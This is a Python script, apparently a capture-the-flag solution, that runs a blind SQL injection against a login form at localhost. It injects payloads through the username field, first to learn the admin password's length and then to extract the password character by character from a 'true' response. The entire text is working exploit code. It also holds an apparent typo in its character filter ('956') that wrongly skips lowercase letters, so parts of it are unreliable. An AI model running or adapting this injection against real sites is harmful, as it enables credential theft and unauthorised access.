import requests

url = "http://localhost"

length = 1
while True:
    id = "' or id=concat('ad', 'min') and length(pw)<{}#".format(length)
    result = requests.post(url, data = {'username': id, 'password': 1})
    if("true" in result.text):
        print ("[*] Password length:", length - 1)
        break
    print ("[+] Finding...", length - 1)
    length += 1

pw = ""
for i in range(1, length):
    for ch in range(48, 123):
        if (58 <= ch <= 64 or 91 <= ch <= 956): continue
        id = "' or id=concat('ad', 'min') and mid(pw,{},1)='{}'#".format(i, chr(ch))
        result = requests.post(url, data = {'username': id, 'password': 1})
        if("true" in result.text):
            pw += chr(ch)
            print ("[+] Finding...", pw)
            break
print ("[*] Password:", pw)